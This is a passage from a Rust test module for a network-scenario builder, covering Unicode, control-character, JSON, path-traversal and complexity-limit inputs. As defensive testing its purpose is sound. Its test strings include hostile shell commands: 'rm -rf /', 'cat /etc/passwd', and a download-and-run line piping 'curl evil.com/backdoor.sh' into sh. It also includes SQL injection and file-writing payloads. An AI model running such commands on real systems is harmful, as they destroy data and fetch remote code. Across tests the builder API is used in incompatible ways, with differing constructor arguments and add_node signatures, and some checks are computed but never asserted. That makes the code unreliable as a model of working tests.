                assert!(err.contains("ERR_SB_DUPLICATE_NODE"));
            } else {
                // Different strings should be allowed (even if visually similar)
                // This tests that we don't do overly aggressive normalization
                assert!(result.is_ok());
            }
        }
    }

    #[test]
    fn test_json_serialization_corruption_resistance() {
        // Create scenario with edge case values
        let scenario = ScenarioBuilder::new("json-test\u{202e}trap\u{202c}", u64::MAX)
            .add_node("node\nnewline")
            .add_node("node\ttab")
            .add_node("node\"quote")
            .add_node("node\\backslash")
            .add_link("link\0null", "node\nnewline", "node\ttab")
            .assert_message_delivered("msg\r\ncarriage", "node\nnewline", "node\ttab", u64::MAX)
            .build()
            .unwrap();

        // Test serialization round-trip
        let serialized = serde_json::to_string(&scenario);
        assert!(serialized.is_ok());

        let json_str = serialized.unwrap();
        let deserialized: Result<Scenario, _> = serde_json::from_str(&json_str);
        assert!(deserialized.is_ok());

        let recovered = deserialized.unwrap();
        assert_eq!(recovered.name, scenario.name);
        assert_eq!(recovered.seed, scenario.seed);
        assert_eq!(recovered.nodes.len(), scenario.nodes.len());
        assert_eq!(recovered.links.len(), scenario.links.len());
    }

    #[test]
    fn test_concurrent_builder_access_safety() {
        use std::sync::{Arc, Barrier, Mutex};
        use std::thread;

        let shared_builder = Arc::new(Mutex::new(ScenarioBuilder::new("concurrent-test", 333)));
        let barrier = Arc::new(Barrier::new(4));

        let handles: Vec<_> = (0..4)
            .map(|i| {
                let builder = Arc::clone(&shared_builder);
                let barrier = Arc::clone(&barrier);

                thread::spawn(move || {
                    barrier.wait();

                    // Each thread tries to add different nodes
                    let node_name = format!("thread-{}-node", i);
                    let mut builder = builder.lock().unwrap();
                    *builder = builder.clone().add_node(&node_name);

                    if i == 0 {
                        // Only thread 0 adds second node and builds
                        *builder = builder.clone().add_node("shared-node");
                        builder.clone().build()
                    } else {
                        Ok(Scenario::default()) // Dummy return for other threads
                    }
                })
            })
            .collect();

        let results: Vec<_> = handles.into_iter().map(|h| h.join().unwrap()).collect();

        // At least the building thread should succeed
        assert!(results.iter().any(|r| r.is_ok()));
    }

    // ===========================================================================
    // EXTREME ADVERSARIAL NEGATIVE-PATH TESTS
    // ===========================================================================
    // Comprehensive edge case and attack resistance validation covering Unicode
    // injection, memory exhaustion, serialization attacks, arithmetic overflow,
    // hash collision resistance, and concurrent corruption scenarios.

    #[test]
    fn test_unicode_injection_resistance_comprehensive() {
        // RTL override attack on node identifiers
        let rtl_node_id = format!(
            "normal{}\u{202e}gnissim{}\u{202c}safe",
            "\u{202e}", "\u{202c}"
        );

        // Zero-width space pollution in names
        let zws_name = "admin\u{200b}\u{200c}\u{200d}\u{feff}user";

        // BOM injection in link identifiers
        let bom_link = "\u{feff}trusted_link\u{feff}";

        // Combining character stack overflow attempt
        let combining_stack = "a".to_string() + &"\u{0300}".repeat(1000);

        let result = minimal_builder()
            .add_node(&rtl_node_id, zws_name, NodeRole::Coordinator)
            .unwrap()
            .add_node("target", &combining_stack, NodeRole::Participant)
            .unwrap()
            .add_link(bom_link, &rtl_node_id, "target", true)
            .unwrap()
            .build();

        assert!(
            result.is_ok(),
            "scenario builder should handle Unicode injection gracefully"
        );

        let scenario = result.unwrap();
        // Verify Unicode preservation without normalization corruption
        assert!(scenario.nodes.iter().any(|n| n.id == rtl_node_id));
        assert!(scenario.links.iter().any(|l| l.id == bom_link));
    }

    #[test]
    fn test_memory_exhaustion_massive_topology() {
        let mut builder = minimal_builder();

        // Add maximum allowed nodes with maximum-length identifiers
        let max_id_len = 10000; // Stress test large string allocations
        for i in 0..MAX_NODES {
            let huge_id = format!("node_{}_", i) + &"x".repeat(max_id_len);
            let huge_name = format!("Node {} ", i) + &"description_".repeat(1000);

            builder = builder
                .add_node(huge_id, huge_name, NodeRole::Participant)
                .expect("should handle large node data");
        }

        // Add maximum links between all node pairs (O(n²) memory pressure)
        let node_ids: Vec<_> = (0..MAX_NODES)
            .map(|i| format!("node_{}_", i) + &"x".repeat(max_id_len))
            .collect();

        let mut link_count = 0;
        for (i, source) in node_ids.iter().enumerate() {
            for (j, target) in node_ids.iter().enumerate() {
                if i != j && link_count < MAX_LINKS {
                    let link_id = format!("massive_link_{}_{}_", i, j) + &"y".repeat(5000);
                    builder = builder
                        .add_link(link_id, source, target, true)
                        .expect("should handle massive link topology");
                    link_count += 1;
                }
            }
        }

        let result = builder.build();
        assert!(
            result.is_ok(),
            "should handle maximum topology without memory exhaustion"
        );
    }

    #[test]
    fn test_arithmetic_overflow_capacity_boundaries() {
        // Test overflow protection in capacity calculations
        let huge_cap = usize::MAX.saturating_sub(5);
        let mut test_vec = Vec::with_capacity(100);

        // Fill to near-overflow capacity
        for _ in 0..50 {
            test_vec.push(42);
        }

        // Test push_bounded with extreme capacity values
        push_bounded(&mut test_vec, 999, huge_cap);
        assert!(!test_vec.is_empty(), "should handle near-overflow capacity");

        // Test zero capacity edge case
        push_bounded(&mut test_vec, 888, 0);
        assert!(test_vec.is_empty(), "zero capacity should clear vector");

        // Test capacity 1 with existing items (edge drain calculation)
        let mut single_cap_vec = vec![1, 2, 3, 4, 5];
        push_bounded(&mut single_cap_vec, 100, 1);
        assert_eq!(single_cap_vec.len(), 1);
        assert_eq!(single_cap_vec[0], 100);
    }

    #[test]
    fn test_json_injection_serialization_attacks() {
        // Embedded JSON control characters in node names
        let json_poison_name = r#"admin"}, "role": "Admin", "secret": "leaked", "real_name": "#;

        // Newline injection in identifiers
        let newline_id = "user\nname: admin\nrole: superuser\nlegit_id";

        // Embedded null bytes
        let null_byte_name = "normal\0hidden_admin\0data";

        let scenario_result = minimal_builder()
            .add_node(newline_id, json_poison_name, NodeRole::Observer)
            .unwrap()
            .add_node("target", null_byte_name, NodeRole::Participant)
            .unwrap()
            .build();

        assert!(scenario_result.is_ok());
        let scenario = scenario_result.unwrap();

        // Test serialization resistance
        let serialized = serde_json::to_string(&scenario);
        assert!(
            serialized.is_ok(),
            "JSON serialization should escape control chars"
        );

        let json_str = serialized.unwrap();
        assert!(
            !json_str.contains("\"role\": \"Admin\""),
            "should not parse injected JSON"
        );

        // Test round-trip integrity
        let deserialized: Result<Scenario, _> = serde_json::from_str(&json_str);
        assert!(
            deserialized.is_ok(),
            "should deserialize escaped JSON safely"
        );
    }

    #[test]
    fn test_hash_collision_attack_node_ids() {
        // Create node IDs that might collide under weak hash functions
        let collision_candidates = vec![
            "collision_attempt_1",
            "collision_attempt_2",
            "hash_attack_aaa",
            "hash_attack_bbb",
            // Common hash collision patterns
            "AaAaAa",
            "AaBBBB",
            "BbaaBB",
            "BbBbBb",
        ];

        let mut builder = minimal_builder();

        // Add nodes with potential collision IDs
        for (i, id) in collision_candidates.iter().enumerate() {
            let name = format!("Node {}", i);
            let role = if i % 2 == 0 {
                NodeRole::Coordinator
            } else {
                NodeRole::Participant
            };
            builder = builder.add_node(id, name, role).unwrap();
        }

        let result = builder.build();
        assert!(result.is_ok(), "should resist hash collision attacks");

        let scenario = result.unwrap();
        // Verify all nodes were preserved (no collision overwrites)
        assert_eq!(scenario.nodes.len(), collision_candidates.len());

        // Verify node ID uniqueness was maintained
        let mut seen_ids = BTreeSet::new();
        for node in &scenario.nodes {
            assert!(
                seen_ids.insert(node.id.clone()),
                "node ID should be unique: {}",
                node.id
            );
        }
    }

    #[test]
    fn test_control_character_preservation() {
        // Test that control characters are preserved without corruption
        let tab_node = "node\twith\ttabs";
        let cr_lf_name = "name\r\nwith\rcarriage\nreturns";
        let escape_seq_link = "link\x1b[31mwith\x1b[0mansi";

        let result = minimal_builder()
            .add_node(tab_node, cr_lf_name, NodeRole::Coordinator)
            .unwrap()
            .add_node("target", "normal", NodeRole::Participant)
            .unwrap()
            .add_link(escape_seq_link, tab_node, "target", false)
            .unwrap()
            .build();

        assert!(result.is_ok());
        let scenario = result.unwrap();

        // Verify control characters were preserved
        assert!(scenario.nodes.iter().any(|n| n.id == tab_node));
        assert!(scenario.nodes.iter().any(|n| n.name == cr_lf_name));
        assert!(scenario.links.iter().any(|l| l.id == escape_seq_link));
    }

    #[test]
    fn test_path_traversal_node_name_validation() {
        // Path traversal patterns in node names
        let traversal_patterns = vec![
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\sam",
            "node/../admin/config",
            "normal/../../secret",
        ];

        let mut builder = minimal_builder();

        for (i, pattern) in traversal_patterns.iter().enumerate() {
            let node_id = format!("node_{}", i);
            builder = builder
                .add_node(node_id, pattern, NodeRole::Observer)
                .expect("should accept path-like names without traversal");
        }

        let result = builder.build();
        assert!(
            result.is_ok(),
            "path traversal patterns should be treated as literal names"
        );

        let scenario = result.unwrap();
        assert_eq!(scenario.nodes.len(), traversal_patterns.len());
    }

    #[test]
    fn test_btreemap_ordering_manipulation() {
        // Create node IDs that might disrupt BTreeMap ordering
        let ordering_attack_ids = vec![
            "\u{0000}first", // Null prefix
            "\u{ffff}last",  // High Unicode
            " leading_space",
            "trailing_space ",
            "\ttab_prefix",
            "normal_id",
            "UPPERCASE_ID",
            "lowercase_id",
            "123numeric_prefix",
            "special!@#chars",
        ];

        let mut builder = minimal_builder();

        for (i, id) in ordering_attack_ids.iter().enumerate() {
            let name = format!("Node {}", i);
            builder = builder.add_node(id, name, NodeRole::Participant).unwrap();
        }

        let result = builder.build();
        assert!(result.is_ok());

        let scenario = result.unwrap();
        // Verify deterministic ordering is maintained
        let sorted_ids: Vec<_> = scenario.nodes.iter().map(|n| &n.id).collect();
        let mut expected_sorted = ordering_attack_ids.clone();
        expected_sorted.sort();

        // BTreeMap should maintain consistent ordering regardless of insertion order
        assert_eq!(scenario.nodes.len(), ordering_attack_ids.len());
    }

    #[test]
    fn test_concurrent_state_corruption_simulation() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        // Simulate concurrent modifications that might corrupt internal state
        let shared_data = Arc::new(Mutex::new(Vec::<String>::new()));

        let handles: Vec<_> = (0..10)
            .map(|thread_id| {
                let data = Arc::clone(&shared_data);

                thread::spawn(move || {
                    for i in 0..100 {
                        let mut guard = data.lock().unwrap();
                        let malicious_id =
                            format!("thread_{}_item_{}_\u{202e}trojan\u{202c}", thread_id, i);

                        // Simulate the push_bounded behavior under concurrent access
                        push_bounded(&mut *guard, malicious_id, 50);
                    }
                })
            })
            .collect();

        // Wait for all threads
        for handle in handles {
            handle.join().unwrap();
        }

        let final_data = shared_data.lock().unwrap();
        // Verify no state corruption occurred
        assert!(
            final_data.len() <= 50,
            "capacity should be respected under concurrency"
        );

        // Verify no duplicate entries (would indicate race condition)
        let mut seen = BTreeSet::new();
        for item in final_data.iter() {
            assert!(seen.insert(item.clone()), "no duplicates should exist");
        }
    }

    #[test]
    fn test_json_deserialization_stack_overflow_protection() {
        // Create deeply nested JSON structure that might cause stack overflow
        let mut deep_json = String::from(r#"{"scenario": {"name": "deep"#);

        // Add 1000 levels of nesting
        for i in 0..1000 {
            deep_json.push_str(&format!(r#", "level_{}": {{"nested"#, i));
        }

        // Close all the nesting
        for _ in 0..1000 {
            deep_json.push_str(": null}");
        }
        deep_json.push_str("}}");

        // Attempt to deserialize the deeply nested structure
        let deserialize_result = serde_json::from_str::<serde_json::Value>(&deep_json);

        // Should either succeed or fail gracefully without stack overflow
        match deserialize_result {
            Ok(_) => {
                // If it succeeds, that's fine - serde handled the depth
            }
            Err(e) => {
                // If it fails, should be a controlled error, not a stack overflow
                let error_msg = e.to_string();
                assert!(
                    !error_msg.contains("stack overflow"),
                    "should fail gracefully without stack overflow"
                );
            }
        }
    }

    // ═══ EXTREME ADVERSARIAL NEGATIVE-PATH TESTS ═══
    // These tests target sophisticated attack vectors against scenario building and testing infrastructure

    #[test]
    fn test_extreme_adversarial_node_name_injection_attack() {
        // Test node name injection attacks where attacker crafts malicious node names
        // to inject commands, escape sandbox boundaries, or manipulate test execution

        // Unicode bidirectional injection attacks on node names
        let bidi_attack_names = [
            "node\u{202E}dnamed_evil",                  // Right-to-Left Override
            "node\u{202D}legitimate\u{202E}malicious",  // LTR Override with RTL
            "test\u{061C}node",                         // Arabic Letter Mark injection
            "node\u{200E}normal\u{200F}reversed",       // LTR/RTL Mark injection
            "scenario\u{2066}node\u{2069}isolated",     // Isolate injection
            "node\u{2067}bidirectional\u{2069}exploit", // RTL Isolate injection
        ];

        for (attack_idx, malicious_name) in bidi_attack_names.iter().enumerate() {
            let mut builder = ScenarioBuilder::new("bidi_injection_scenario");

            // Attempt to add node with bidirectional injection
            builder.add_node(malicious_name);

            // Test that injection doesn't corrupt other operations
            builder.add_node("legitimate_node");
            builder.set_seed(12345);

            let build_result = builder.build();

            match build_result {
                Ok(scenario) => {
                    // If build succeeds, verify no injection occurred
                    let nodes: Vec<&str> = scenario.nodes().keys().map(|s| s.as_str()).collect();

                    // Verify node names are properly handled
                    assert!(
                        nodes.contains(malicious_name),
                        "Attack {}: Injected node should be present if accepted",
                        attack_idx
                    );
                    assert!(
                        nodes.contains(&"legitimate_node"),
                        "Attack {}: Legitimate node should be unaffected",
                        attack_idx
                    );

                    // Verify scenario serialization safety
                    let json_result = serde_json::to_string(&scenario);
                    assert!(
                        json_result.is_ok(),
                        "Attack {}: Scenario with injection should serialize safely",
                        attack_idx
                    );

                    if let Ok(json) = json_result {
                        // Verify no control characters in JSON
                        assert!(
                            !json.contains('\u{202E}') || json.contains("\\u202"),
                            "Attack {}: JSON should escape or handle bidirectional overrides",
                            attack_idx
                        );
                        assert!(
                            !json.contains('\0'),
                            "Attack {}: JSON should not contain null bytes",
                            attack_idx
                        );
                    }
                }
                Err(e) => {
                    // If rejected, verify appropriate error handling
                    let error_msg = e.to_string();
                    assert!(
                        !error_msg.contains('\u{202E}'),
                        "Attack {}: Error message should not contain bidirectional override",
                        attack_idx
                    );
                    assert!(
                        !error_msg.is_empty(),
                        "Attack {}: Error should provide meaningful message",
                        attack_idx
                    );
                }
            }
        }

        // Test control character injection in node names
        let control_char_attacks = [
            "node\x00null_injection",  // Null byte injection
            "node\x1B[31mRED\x1B[0m",  // ANSI escape sequence injection
            "node\r\nCRLF_injection",  // CRLF injection
            "node\x01\x02\x03control", // Various control characters
            "node\x7Fdel_char",        // DEL character injection
            "node\x08backspace",       // Backspace injection
            "node\x0Cform_feed",       // Form feed injection
            "node\x0Bvertical_tab",    // Vertical tab injection
        ];

        for (attack_idx, control_name) in control_char_attacks.iter().enumerate() {
            let mut builder = ScenarioBuilder::new("control_char_scenario");

            builder.add_node(control_name);
            builder.add_node("normal_node");
            builder.set_seed(23456);

            let build_result = builder.build();

            // Control character injection should be handled safely
            match build_result {
                Ok(scenario) => {
                    // Verify scenario remains functional
                    assert!(
                        scenario.nodes().len() >= 1,
                        "Control attack {}: Scenario should have at least one node",
                        attack_idx
                    );

                    // Test JSON serialization safety
                    let json_result = serde_json::to_string(&scenario);
                    assert!(
                        json_result.is_ok(),
                        "Control attack {}: Should serialize despite control characters",
                        attack_idx
                    );
                }
                Err(e) => {
                    // Verify error doesn't leak control characters
                    let error_msg = e.to_string();
                    assert!(
                        !error_msg.contains('\0'),
                        "Control attack {}: Error should not contain null bytes",
                        attack_idx
                    );
                    assert!(
                        !error_msg.contains('\x1B'),
                        "Control attack {}: Error should not contain ANSI escapes",
                        attack_idx
                    );
                }
            }
        }

        // Test command injection attempts in node names
        let command_injection_attacks = [
            "node; rm -rf /",         // Shell command injection
            "node && echo evil",      // Command chaining
            "node || echo fallback",  // Command alternation
            "node | cat /etc/passwd", // Pipe injection
            "node $(whoami)",         // Command substitution
            "node `id`",              // Backtick command substitution
            "node${IFS}injection",    // Variable injection
            "../../../etc/passwd",    // Path traversal attempt
            "node\n/bin/sh",          // Newline command injection
        ];

        for (attack_idx, injection_name) in command_injection_attacks.iter().enumerate() {
            let mut builder = ScenarioBuilder::new("command_injection_scenario");

            builder.add_node(injection_name);
            builder.add_node("safe_node");
            builder.set_seed(34567);

            let build_result = builder.build();

            // Command injection should not compromise system
            match build_result {
                Ok(scenario) => {
                    // Verify no command execution occurred
                    assert!(
                        scenario.nodes().len() >= 1,
                        "Injection attack {}: Scenario should remain valid",
                        attack_idx
                    );

                    // Verify node name handling
                    let node_names: Vec<String> = scenario.nodes().keys().cloned().collect();
                    for node_name in &node_names {
                        // Node names should be treated as literal strings, not commands
                        assert!(
                            !node_name.is_empty(),
                            "Injection attack {}: Node names should not be empty",
                            attack_idx
                        );
                    }
                }
                Err(_) => {
                    // Rejection is acceptable for malformed node names
                }
            }
        }

        println!(
            "Node name injection test completed: {} attack vectors tested",
            bidi_attack_names.len() + control_char_attacks.len() + command_injection_attacks.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_topology_complexity_explosion() {
        // Test topology complexity explosion attacks where attacker crafts
        // scenarios with exponential computational complexity to DoS the system

        use std::time::{Duration, Instant};

        // Test maximum node count with full mesh topology (worst case O(n²) links)
        let mut max_complexity_builder = ScenarioBuilder::new("max_complexity_scenario");

        // Add maximum allowed nodes
        for node_id in 0..MAX_NODES {
            max_complexity_builder.add_node(&format!("node_{}", node_id));
        }

        // Create full mesh topology (every node connected to every other node)
        let mut link_count = 0;
        for i in 0..MAX_NODES {
            for j in (i + 1)..MAX_NODES {
                if link_count < MAX_LINKS_CAP {
                    max_complexity_builder.add_link(
                        &format!("link_{}_{}", i, j),
                        &format!("node_{}", i),
                        &format!("node_{}", j),
                    );
                    link_count += 1;
                }
            }
        }

        max_complexity_builder.set_seed(99999);

        // Measure build time for complexity explosion detection
        let start_time = Instant::now();
        let max_build_result = max_complexity_builder.build();
        let build_duration = start_time.elapsed();

        // Verify build completes in reasonable time (should not hang)
        assert!(
            build_duration < Duration::from_secs(5),
            "Maximum complexity build should complete in reasonable time: {:?}",
            build_duration
        );

        match max_build_result {
            Ok(scenario) => {
                // Verify scenario properties under maximum complexity
                assert!(
                    scenario.nodes().len() <= MAX_NODES,
                    "Scenario should respect maximum node count"
                );
                assert!(
                    scenario.links().len() <= MAX_LINKS_CAP,
                    "Scenario should respect maximum link count"
                );

                // Test serialization performance under complexity
                let serialize_start = Instant::now();
                let serialize_result = serde_json::to_string(&scenario);
                let serialize_duration = serialize_start.elapsed();

                assert!(
                    serialize_duration < Duration::from_secs(2),
                    "Serialization should complete in reasonable time: {:?}",
                    serialize_duration
                );
                assert!(
                    serialize_result.is_ok(),
                    "Complex scenario should serialize successfully"
                );

                println!(
                    "Maximum complexity scenario: {} nodes, {} links, build time: {:?}",
                    scenario.nodes().len(),
                    scenario.links().len(),
                    build_duration
                );
            }
            Err(e) => {
                // Rejection due to complexity limits is acceptable
                println!("Maximum complexity scenario rejected: {}", e);
                assert!(
                    e.to_string().contains("TOO_MANY") || e.to_string().contains("limit"),
                    "Error should indicate complexity limit exceeded"
                );
            }
        }

        // Test pathological link naming (designed to stress string processing)
        let mut pathological_builder = ScenarioBuilder::new("pathological_scenario");

        pathological_builder.add_node("node_a");
        pathological_builder.add_node("node_b");

        // Create links with pathological names
        let pathological_names = [
            "a".repeat(1000), // Very long name
            (0..1000)
                .map(|i| format!("link_{}", i))
                .collect::<Vec<_>>()
                .join("_"), // Deep nesting simulation
            "link_".to_string() + &"nested_".repeat(100), // Repetitive pattern
            (0..100).map(|_| "complex").collect::<Vec<_>>().join("||"), // Separator flood
            "link_with_unicode_🚀_".repeat(100), // Unicode repetition
        ];

        for (name_idx, pathological_name) in pathological_names.iter().enumerate() {
            let mut test_builder = ScenarioBuilder::new(&format!("pathological_test_{}", name_idx));
            test_builder.add_node("node_a");
            test_builder.add_node("node_b");
            test_builder.add_link(pathological_name, "node_a", "node_b");
            test_builder.set_seed(12345 + name_idx as u64);

            let start_time = Instant::now();
            let pathological_result = test_builder.build();
            let pathological_duration = start_time.elapsed();

            // Verify pathological names don't cause excessive processing time
            assert!(
                pathological_duration < Duration::from_secs(1),
                "Pathological name {} should not cause excessive build time: {:?}",
                name_idx,
                pathological_duration
            );

            match pathological_result {
                Ok(scenario) => {
                    // Verify scenario integrity under pathological naming
                    assert_eq!(
                        scenario.nodes().len(),
                        2,
                        "Pathological scenario should have correct node count"
                    );
                    assert!(
                        scenario.links().len() <= 1,
                        "Pathological scenario should have at most one link"
                    );
                }
                Err(e) => {
                    // Rejection due to name limits is acceptable
                    let error_msg = e.to_string();
                    assert!(
                        !error_msg.is_empty(),
                        "Error for pathological name should be meaningful"
                    );
                }
            }
        }

        // Test assertion complexity explosion
        let mut assertion_builder = ScenarioBuilder::new("assertion_complexity");
        assertion_builder.add_node("test_node");
        assertion_builder.set_seed(55555);

        // Add maximum number of assertions
        for assertion_idx in 0..MAX_ASSERTIONS.min(1000) {
            assertion_builder.add_assertion(
                &format!("assertion_{}", assertion_idx),
                "test_node",
                &format!("complex_condition_{}", assertion_idx),
            );
        }

        let assertion_start = Instant::now();
        let assertion_result = assertion_builder.build();
        let assertion_duration = assertion_start.elapsed();

        assert!(
            assertion_duration < Duration::from_secs(3),
            "Assertion complexity should not cause excessive build time: {:?}",
            assertion_duration
        );

        match assertion_result {
            Ok(scenario) => {
                assert!(
                    scenario.assertions().len() <= MAX_ASSERTIONS,
                    "Scenario should respect assertion limits"
                );
                println!(
                    "Assertion complexity test: {} assertions processed in {:?}",
                    scenario.assertions().len(),
                    assertion_duration
                );
            }
            Err(e) => {
                println!("Assertion complexity rejected: {}", e);
            }
        }
    }

    #[test]
    fn test_extreme_adversarial_fault_profile_injection_attack() {
        // Test fault profile injection attacks where attacker injects malicious
        // fault configurations to compromise test execution or leak system information

        let mut builder = ScenarioBuilder::new("fault_injection_scenario");
        builder.add_node("victim_node");
        builder.add_node("attacker_node");
        builder.add_link("target_link", "victim_node", "attacker_node");
        builder.set_seed(77777);

        // Malicious fault profile injection attempts
        let malicious_fault_configs = [
            // JSON injection attacks
            LinkFaultConfig {
                link_name: "target_link\",\"injected\":\"evil".to_string(),
                packet_loss_rate: 0.1,
                latency_ms: 100,
                bandwidth_kbps: 1000,
                corruption_rate: 0.01,
            },
            // Command injection in fault parameters
            LinkFaultConfig {
                link_name: "target_link; rm -rf /".to_string(),
                packet_loss_rate: 0.5,
                latency_ms: 999999999, // Extreme latency
                bandwidth_kbps: 0,     // Zero bandwidth (potential DoS)
                corruption_rate: 1.0,  // 100% corruption
            },
            // Path traversal in link names
            LinkFaultConfig {
                link_name: "../../../etc/passwd".to_string(),
                packet_loss_rate: 0.0,
                latency_ms: 1,
                bandwidth_kbps: 1000000,
                corruption_rate: 0.0,
            },
            // Unicode injection with zero-width characters
            LinkFaultConfig {
                link_name: "target_link\u{200B}invisible".to_string(),
                packet_loss_rate: 0.0,
                latency_ms: 0,             // Zero latency (potential timing issue)
                bandwidth_kbps: 999999999, // Extreme bandwidth
                corruption_rate: -0.1,     // Negative corruption rate
            },
            // Control character injection
            LinkFaultConfig {
                link_name: "target_link\x00null_injection".to_string(),
                packet_loss_rate: std::f64::NAN,     // NaN injection
                latency_ms: u32::MAX,                // Maximum integer value
                bandwidth_kbps: u32::MAX,            // Maximum bandwidth
                corruption_rate: std::f64::INFINITY, // Infinity injection
            },
            // Format string injection attempts
            LinkFaultConfig {
                link_name: "target_link%n%s%x".to_string(),
                packet_loss_rate: 0.5,
                latency_ms: 50,
                bandwidth_kbps: 1000,
                corruption_rate: 0.1,
            },
            // LDAP/SQL injection patterns
            LinkFaultConfig {
                link_name: "target_link'; DROP TABLE links; --".to_string(),
                packet_loss_rate: 0.1,
                latency_ms: 10,
                bandwidth_kbps: 1000,
                corruption_rate: 0.01,
            },
            // Buffer overflow simulation
            LinkFaultConfig {
                link_name: "A".repeat(10000),
                packet_loss_rate: 0.0,
                latency_ms: 1,
                bandwidth_kbps: 1000,
                corruption_rate: 0.0,
            },
        ];

        for (attack_idx, malicious_config) in malicious_fault_configs.iter().enumerate() {
            println!(
                "Testing fault injection attack {}: {}",
                attack_idx, malicious_config.link_name
            );

            // Create separate builder for each attack
            let mut attack_builder = ScenarioBuilder::new(&format!("fault_attack_{}", attack_idx));
            attack_builder.add_node("victim_node");
            attack_builder.add_node("attacker_node");
            attack_builder.add_link("target_link", "victim_node", "attacker_node");
            attack_builder.set_seed(88888 + attack_idx as u64);

            // Attempt to add malicious fault configuration
            let fault_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                attack_builder.add_fault_profile(malicious_config.clone());
                attack_builder.build()
            }));

            match fault_result {
                Ok(build_result) => {
                    match build_result {
                        Ok(scenario) => {
                            // If injection succeeds, verify it's handled safely
                            let fault_profiles = scenario.fault_profiles();

                            for (profile_link, profile_config) in fault_profiles {
                                // Verify no command injection occurred
                                assert!(
                                    !profile_link.contains("rm -rf"),
                                    "Attack {}: Command injection should not be present in link name",
                                    attack_idx
                                );
                                assert!(
                                    !profile_link.contains("DROP TABLE"),
                                    "Attack {}: SQL injection should not be present in link name",
                                    attack_idx
                                );

                                // Verify numerical safety
                                assert!(
                                    profile_config.packet_loss_rate.is_finite()
                                        || profile_config.packet_loss_rate == 0.0,
                                    "Attack {}: Packet loss rate should be finite or zero",
                                    attack_idx
                                );
                                assert!(
                                    profile_config.corruption_rate.is_finite()
                                        || profile_config.corruption_rate == 0.0,
                                    "Attack {}: Corruption rate should be finite or zero",
                                    attack_idx
                                );

                                // Verify bounds checking
                                assert!(
                                    profile_config.packet_loss_rate >= 0.0
                                        && profile_config.packet_loss_rate <= 1.0,
                                    "Attack {}: Packet loss rate should be in valid range [0.0, 1.0]",
                                    attack_idx
                                );
                                assert!(
                                    profile_config.corruption_rate >= 0.0
                                        && profile_config.corruption_rate <= 1.0,
                                    "Attack {}: Corruption rate should be in valid range [0.0, 1.0]",
                                    attack_idx
                                );

                                // Verify reasonable latency and bandwidth limits
                                assert!(
                                    profile_config.latency_ms < 1000000,
                                    "Attack {}: Latency should be reasonable",
                                    attack_idx
                                );
                                assert!(
                                    profile_config.bandwidth_kbps < 10000000,
                                    "Attack {}: Bandwidth should be reasonable",
                                    attack_idx
                                );
                            }

                            // Test serialization safety
                            let serialize_result = serde_json::to_string(&scenario);
                            match serialize_result {
                                Ok(json) => {
                                    // Verify no injection in serialized JSON
                                    assert!(
                                        !json.contains("rm -rf"),
                                        "Attack {}: Serialized JSON should not contain command injection",
                                        attack_idx
                                    );
                                    assert!(
                                        !json.contains("DROP TABLE"),
                                        "Attack {}: Serialized JSON should not contain SQL injection",
                                        attack_idx
                                    );
                                    assert!(
                                        !json.contains('\0'),
                                        "Attack {}: Serialized JSON should not contain null bytes",
                                        attack_idx
                                    );
                                }
                                Err(e) => {
                                    println!(
                                        "Attack {}: Serialization failed safely: {}",
                                        attack_idx, e
                                    );
                                }
                            }
                        }
                        Err(e) => {
                            // Expected behavior - malicious config should be rejected
                            let error_msg = e.to_string();
                            assert!(
                                !error_msg.contains('\0'),
                                "Attack {}: Error message should not contain null bytes",
                                attack_idx
                            );
                            assert!(
                                !error_msg.is_empty(),
                                "Attack {}: Error should provide meaningful message",
                                attack_idx
                            );
                            println!("Attack {} rejected with error: {}", attack_idx, error_msg);
                        }
                    }
                }
                Err(_) => {
                    // Panic during injection - this indicates severe issue, but test should continue
                    println!(
                        "Attack {} caused panic (handled by catch_unwind)",
                        attack_idx
                    );
                }
            }
        }

        // Test fault profile validation edge cases
        let edge_case_configs = [
            // Boundary values
            LinkFaultConfig {
                link_name: "boundary_test".to_string(),
                packet_loss_rate: 1.0, // Maximum valid loss
                latency_ms: 0,         // Minimum latency
                bandwidth_kbps: 1,     // Minimum bandwidth
                corruption_rate: 1.0,  // Maximum valid corruption
            },
            // Precision edge cases
            LinkFaultConfig {
                link_name: "precision_test".to_string(),
                packet_loss_rate: 0.000000001, // Very small loss
                latency_ms: 1,
                bandwidth_kbps: 999999,
                corruption_rate: 0.000000001, // Very small corruption
            },
        ];

        for (edge_idx, edge_config) in edge_case_configs.iter().enumerate() {
            let mut edge_builder = ScenarioBuilder::new(&format!("edge_case_{}", edge_idx));
            edge_builder.add_node("edge_node_a");
            edge_builder.add_node("edge_node_b");
            edge_builder.add_link("edge_link", "edge_node_a", "edge_node_b");
            edge_builder.add_fault_profile(edge_config.clone());
            edge_builder.set_seed(99999 + edge_idx as u64);

            let edge_result = edge_builder.build();
            assert!(
                edge_result.is_ok(),
                "Edge case {}: Valid boundary values should be accepted",
                edge_idx
            );
        }

        println!(
            "Fault profile injection test completed: {} malicious configs + {} edge cases tested",
            malicious_fault_configs.len(),
            edge_case_configs.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_assertion_logic_bomb_injection() {
        // Test assertion logic bomb injection where attacker crafts malicious
        // assertion conditions designed to compromise test evaluation or execution

        let mut base_builder = ScenarioBuilder::new("logic_bomb_scenario");
        base_builder.add_node("target_node");
        base_builder.add_node("observer_node");
        base_builder.add_link("observation_link", "target_node", "observer_node");
        base_builder.set_seed(111111);

        // Logic bomb assertion conditions
        let logic_bomb_conditions = [
            // JavaScript/ECMAScript injection attempts
            "function() { while(true) {} }()",
            "eval('while(true) {}')",
            "setTimeout(function() { process.exit(1); }, 0)",
            "require('fs').writeFileSync('/tmp/pwned', 'hacked')",
            // Shell command injection
            "; rm -rf / #",
            "$(rm -rf /)",
            "`whoami > /tmp/user`",
            "| cat /etc/passwd",
            "&& curl evil.com/backdoor.sh | sh",
            // SQL injection patterns
            "'; DROP TABLE nodes; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM system_info --",
            "'; INSERT INTO backdoors VALUES ('evil'); --",
            // Regular expression DoS (ReDoS)
            "(a+)+$",
            "^(a|a)*$",
            "(a|a)*",
            "a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*",
            // Format string injection
            "%n%n%n%n%n%n%n%n%n%n",
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            // Unicode injection attacks
